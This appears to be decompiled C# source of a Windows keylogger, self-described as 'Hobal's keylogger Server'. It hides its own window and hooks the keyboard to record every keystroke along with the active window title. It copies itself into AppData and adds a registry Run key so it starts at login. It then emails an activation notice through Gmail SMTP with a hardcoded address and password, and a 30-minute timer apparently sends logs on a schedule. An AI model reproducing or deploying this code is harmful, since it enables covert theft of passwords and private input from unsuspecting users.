using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns5;

namespace ns2;

[DesignerGenerated]
internal sealed class Form1 : Form
{
	public struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;
	}

	public enum Enum0
	{
		const_0 = 13,
		const_1 = 8,
		const_2 = 32,
		const_3 = 9,
		const_4 = 27,
		const_5 = 17,
		const_6 = 162,
		const_7 = 163,
		const_8 = 46,
		const_9 = 35,
		const_10 = 36,
		const_11 = 45,
		const_12 = 16,
		const_13 = 160,
		const_14 = 161,
		const_15 = 19,
		const_16 = 44,
		const_17 = 91,
		const_18 = 92,
		const_19 = 18,
		const_20 = 164,
		const_21 = 165,
		const_22 = 144,
		const_23 = 20,
		const_24 = 38,
		const_25 = 40,
		const_26 = 39,
		const_27 = 37,
		const_28 = 112,
		const_29 = 113,
		const_30 = 114,
		const_31 = 115,
		const_32 = 116,
		const_33 = 117,
		const_34 = 118,
		const_35 = 119,
		const_36 = 120,
		const_37 = 121,
		const_38 = 122,
		const_39 = 123,
		const_40 = 124,
		const_41 = 125,
		const_42 = 126,
		const_43 = 127,
		const_44 = 128,
		const_45 = 129,
		const_46 = 130,
		const_47 = 131,
		const_48 = 132,
		const_49 = 133,
		const_50 = 134,
		const_51 = 135,
		const_52 = 96,
		const_53 = 97,
		const_54 = 98,
		const_55 = 99,
		const_56 = 100,
		const_57 = 101,
		const_58 = 102,
		const_59 = 103,
		const_60 = 104,
		const_61 = 105,
		const_62 = 107,
		const_63 = 111,
		const_64 = 106,
		const_65 = 109,
		const_66 = 110,
		const_67 = 48,
		const_68 = 49,
		const_69 = 50,
		const_70 = 51,
		const_71 = 52,
		const_72 = 53,
		const_73 = 54,
		const_74 = 55,
		const_75 = 56,
		const_76 = 57,
		const_77 = 65,
		const_78 = 66,
		const_79 = 67,
		const_80 = 68,
		const_81 = 69,
		const_82 = 70,
		const_83 = 71,
		const_84 = 72,
		const_85 = 73,
		const_86 = 74,
		const_87 = 75,
		const_88 = 76,
		const_89 = 77,
		const_90 = 78,
		const_91 = 79,
		const_92 = 80,
		const_93 = 81,
		const_94 = 82,
		const_95 = 83,
		const_96 = 84,
		const_97 = 85,
		const_98 = 86,
		const_99 = 87,
		const_100 = 88,
		const_101 = 89,
		const_102 = 90,
		const_103 = 189,
		const_104 = 190
	}

	internal delegate int Delegate0(int Code, int wParam, ref Struct0 lParam);

	private IContainer icontainer_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	internal string string_0;

	internal string string_1;

	private string string_2;

	private string string_3;

	private const int int_0 = 257;

	private const short short_0 = 256;

	private const int int_1 = 260;

	private const int int_2 = 261;

	internal IntPtr intptr_0;

	private string string_4;

	internal Delegate0 delegate0_0;

	public string string_5;

	internal virtual TextBox TextBox1
	{
		get
		{
			return textBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			textBox_0 = value;
		}
	}

	internal unsafe virtual Timer Timer1
	{
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this, (nint)(delegate*<Form1, object, EventArgs, void>)(&Class32.smethod_5));
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_0 = "hobal.log@gmail.com";
		string_1 = "abcde54321";
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string_3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Windows NT";
		intptr_0 = (IntPtr)0;
		string_4 = "";
		delegate0_0 = null;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		Timer1 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(0, 0);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1800000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public unsafe int method_0(int Code, int wParam, ref Struct0 lParam)
	{
		//IL_050f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Unknown result type (might be due to invalid IL or missing references)
		//IL_051b: Invalid comparison between Unknown and I4
		//IL_0528: Unknown result type (might be due to invalid IL or missing references)
		//IL_0532: Unknown result type (might be due to invalid IL or missing references)
		//IL_0534: Invalid comparison between Unknown and I4
		//IL_054c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0556: Unknown result type (might be due to invalid IL or missing references)
		//IL_0558: Invalid comparison between Unknown and I4
		//IL_0570: Unknown result type (might be due to invalid IL or missing references)
		//IL_057a: Unknown result type (might be due to invalid IL or missing references)
		//IL_057c: Invalid comparison between Unknown and I4
		//IL_0589: Unknown result type (might be due to invalid IL or missing references)
		//IL_0593: Unknown result type (might be due to invalid IL or missing references)
		//IL_0595: Invalid comparison between Unknown and I4
		//IL_05ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b9: Invalid comparison between Unknown and I4
		//IL_05c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d2: Invalid comparison between Unknown and I4
		//IL_05ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f6: Invalid comparison between Unknown and I4
		//IL_0603: Unknown result type (might be due to invalid IL or missing references)
		//IL_060d: Unknown result type (might be due to invalid IL or missing references)
		//IL_060f: Invalid comparison between Unknown and I4
		//IL_0627: Unknown result type (might be due to invalid IL or missing references)
		//IL_0631: Unknown result type (might be due to invalid IL or missing references)
		//IL_0633: Invalid comparison between Unknown and I4
		//IL_0640: Unknown result type (might be due to invalid IL or missing references)
		//IL_064a: Unknown result type (might be due to invalid IL or missing references)
		//IL_064c: Invalid comparison between Unknown and I4
		//IL_0664: Unknown result type (might be due to invalid IL or missing references)
		//IL_066e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0670: Invalid comparison between Unknown and I4
		//IL_067d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0687: Unknown result type (might be due to invalid IL or missing references)
		//IL_0689: Invalid comparison between Unknown and I4
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ad: Invalid comparison between Unknown and I4
		//IL_06ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c6: Invalid comparison between Unknown and I4
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ea: Invalid comparison between Unknown and I4
		//IL_06f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0701: Unknown result type (might be due to invalid IL or missing references)
		//IL_0703: Invalid comparison between Unknown and I4
		//IL_071b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0725: Unknown result type (might be due to invalid IL or missing references)
		//IL_0727: Invalid comparison between Unknown and I4
		//IL_0734: Unknown result type (might be due to invalid IL or missing references)
		//IL_073e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0740: Invalid comparison between Unknown and I4
		//IL_0866: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Unknown result type (might be due to invalid IL or missing references)
		//IL_0872: Invalid comparison between Unknown and I4
		//IL_087f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0889: Unknown result type (might be due to invalid IL or missing references)
		//IL_088b: Invalid comparison between Unknown and I4
		//IL_08a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_08af: Invalid comparison between Unknown and I4
		//IL_08c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d3: Invalid comparison between Unknown and I4
		//IL_08eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Invalid comparison between Unknown and I4
		//IL_090f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0919: Unknown result type (might be due to invalid IL or missing references)
		//IL_091b: Invalid comparison between Unknown and I4
		//IL_0933: Unknown result type (might be due to invalid IL or missing references)
		//IL_093d: Unknown result type (might be due to invalid IL or missing references)
		//IL_093f: Invalid comparison between Unknown and I4
		//IL_094c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0956: Unknown result type (might be due to invalid IL or missing references)
		//IL_0958: Invalid comparison between Unknown and I4
		//IL_0970: Unknown result type (might be due to invalid IL or missing references)
		//IL_097a: Unknown result type (might be due to invalid IL or missing references)
		//IL_097c: Invalid comparison between Unknown and I4
		//IL_0994: Unknown result type (might be due to invalid IL or missing references)
		//IL_099e: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a0: Invalid comparison between Unknown and I4
		//IL_09c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Invalid comparison between Unknown and I4
		//IL_0a04: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a10: Invalid comparison between Unknown and I4
		void* ptr = stackalloc byte[16];
		string text = Class32.smethod_150(this);
		if (Operators.CompareString(text, string_4, false) != 0)
		{
			string_4 = text;
			string_5 = string_5 + "\r\n----------- " + text + " (" + DateAndTime.get_Now().ToString() + ") ------------\r\n";
		}
		string text2 = "";
		if (wParam == 256 || wParam == 260)
		{
			checked
			{
				switch (lParam.int_0)
				{
				case 3:
					text2 = "[attn]";
					break;
				case 8:
					text2 = "[bkspace]";
					break;
				case 9:
					text2 = "[tab]";
					break;
				case 13:
					text2 = "\r\n";
					break;
				case 19:
					text2 = "[Break]";
					break;
				case 20:
					text2 = ((!((Computer)Class1.Computer).get_Keyboard().get_CapsLock()) ? "[caps]" : "[/caps]");
					break;
				case 27:
					text2 = "[esc]";
					break;
				case 32:
					text2 = " ";
					break;
				case 33:
					text2 = "[Page UP]";
					break;
				case 34:
					text2 = "[page DOWN]";
					break;
				case 35:
					text2 = "[End]";
					break;
				case 36:
					text2 = "[Home]";
					break;
				case 37:
					text2 = "[Left Arrow]";
					break;
				case 38:
					text2 = "[Up Arrow]";
					break;
				case 39:
					text2 = "[Right Arrow]";
					break;
				case 40:
					text2 = "[Down Arrow]";
					break;
				case 44:
					text2 = "[Print screen key]";
					break;
				case 45:
					text2 = "[insert]";
					break;
				case 46:
					text2 = "[delete]";
					break;
				case 48:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "à" : "@") : "0");
					break;
				case 49:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? "&" : "1");
					break;
				case 50:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "é" : "~") : "2");
					break;
				case 51:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "\"" : "#") : "3");
					break;
				case 52:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "'" : "{") : "4");
					break;
				case 53:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "(" : "[") : "5");
					break;
				case 54:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "-" : "|") : "6");
					break;
				case 55:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "è" : "`") : "7");
					break;
				case 56:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "_" : "\\") : "8");
					break;
				case 57:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "ç" : "^") : "9");
					break;
				case 65:
				case 66:
				case 67:
				case 68:
				case 69:
				case 70:
				case 71:
				case 72:
				case 73:
				case 74:
				case 75:
				case 76:
				case 77:
				case 78:
				case 79:
				case 80:
				case 81:
				case 82:
				case 83:
				case 84:
				case 85:
				case 86:
				case 87:
				case 88:
				case 89:
				case 90:
					text2 = Conversions.ToString(Strings.ChrW(lParam.int_0 + 32));
					break;
				case 91:
					text2 = "[Left Win]";
					break;
				case 92:
					text2 = "[Right Win]";
					break;
				case 96:
					text2 = "0";
					break;
				case 106:
					text2 = "*";
					break;
				case 107:
					text2 = "+";
					break;
				case 109:
					text2 = "-";
					break;
				case 110:
					text2 = ".";
					break;
				case 111:
					text2 = "/";
					break;
				case 112:
				case 113:
				case 114:
				case 115:
				case 116:
				case 117:
				case 118:
				case 119:
				case 120:
				case 121:
				case 122:
				case 123:
				case 124:
				case 125:
				case 126:
				case 127:
				case 128:
				case 129:
				case 130:
				case 131:
				case 132:
				case 133:
				case 134:
				case 135:
					text2 = "[F" + Conversions.ToString(lParam.int_0 - 111) + "]";
					break;
				case 144:
					text2 = (Control.IsKeyLocked((Keys)144) ? "[/NUM LOCK]" : "[NUM LOCK]");
					break;
				case 145:
					text2 = "[arr déf]";
					break;
				case 160:
				case 161:
					text2 = "[shift]";
					break;
				case 162:
				case 163:
					text2 = "[control]";
					break;
				case 164:
					text2 = "[alt]";
					break;
				case 165:
					text2 = "[alt gr]";
					break;
				case 173:
					text2 = "[mute volume]";
					break;
				case 174:
					text2 = "[(-) volume]";
					break;
				case 175:
					text2 = "[(+) volume]";
					break;
				case 186:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? "$" : "¤") : "£");
					break;
				case 188:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? "," : "?");
					break;
				case 190:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? ";" : ".");
					break;
				case 191:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? ":" : "/");
					break;
				case 192:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? "ù" : "%");
					break;
				case 219:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? (((Control.get_ModifierKeys() & 0x40000) == 0) ? ")" : "]") : "°");
					break;
				case 220:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? "*" : "µ");
					break;
				case 221:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? "^" : "\u00a8");
					break;
				case 222:
					text2 = "²";
					break;
				case 223:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? "!" : "§");
					break;
				default:
					text2 = "{" + lParam.int_0 + "}";
					break;
				case 226:
					text2 = (((Control.get_ModifierKeys() & 0x10000) == 0) ? "<" : ">");
					break;
				}
			}
		}
		else if (wParam == 257 || wParam == 261)
		{
			switch (lParam.int_0)
			{
			case 160:
			case 161:
				text2 = "[/shift]";
				break;
			case 162:
			case 163:
				text2 = "[/control]";
				break;
			case 164:
				text2 = "[/alt]";
				break;
			case 165:
				text2 = "[/alt gr]";
				break;
			}
		}
		if (Operators.CompareString(text2, "", false) != 0)
		{
			string_5 += text2;
			TextBox1.set_Text(string_5);
		}
		*(int*)ptr = Class32.CallNextHookEx((int)intptr_0, Code, wParam, lParam);
		*(int*)((byte*)ptr + 12) = *(int*)ptr;
		return *(int*)((byte*)ptr + 12);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		if (Application.get_StartupPath().Contains(string_2))
		{
			((ServerComputer)Class1.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
		}
		else
		{
			Class32.smethod_34(this, string_2);
		}
		string path = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\firefox.tmp");
		File.Delete(path);
		Class32.smethod_59(this);
		string text = ((ServerComputer)Class1.Computer).get_Clock().get_LocalTime().ToString();
		try
		{
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential(string_0, string_1);
			smtpClient.Port = 587;
			smtpClient.Host = "smtp.gmail.com";
			smtpClient.EnableSsl = true;
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(string_0);
			mailMessage.To.Add(string_0);
			mailMessage.Subject = "+-- Hobal's keylogger Server SuccessFully Activated on " + ((ServerComputer)Class1.Computer).get_Name().ToString() + " At " + Conversions.ToString(((ServerComputer)Class1.Computer).get_Clock().get_LocalTime());
			mailMessage.Body = "path : " + Application.get_StartupPath() + "\r\nexecution time : " + text + "\r\n";
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
